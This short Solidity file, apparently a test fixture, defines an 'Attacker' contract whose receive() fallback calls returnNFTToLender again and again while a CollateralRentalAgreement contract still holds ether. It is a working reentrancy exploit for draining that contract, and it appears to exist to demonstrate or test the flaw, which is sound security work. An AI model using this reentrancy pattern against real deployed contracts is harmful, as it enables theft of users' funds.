// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {CollateralRentalAgreement} from '../../src/CollateralRentalAgreement.sol';
import {IERC721Receiver} from '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';

contract Attacker is IERC721Receiver {
    CollateralRentalAgreement public immutable rentalAgreement;

    constructor(address rentalAgreementAddress) {
        rentalAgreement = CollateralRentalAgreement(rentalAgreementAddress);
    }

    function attack() external {
        rentalAgreement.returnNFTToLender();
    }

    function onERC721Received(
        address, /* operator */
        address, /* from */
        uint256, /* tokenId */
        bytes memory /* data */
    ) public pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {
        if (address(rentalAgreement).balance > 0) {
            rentalAgreement.returnNFTToLender();
        }
    }
} 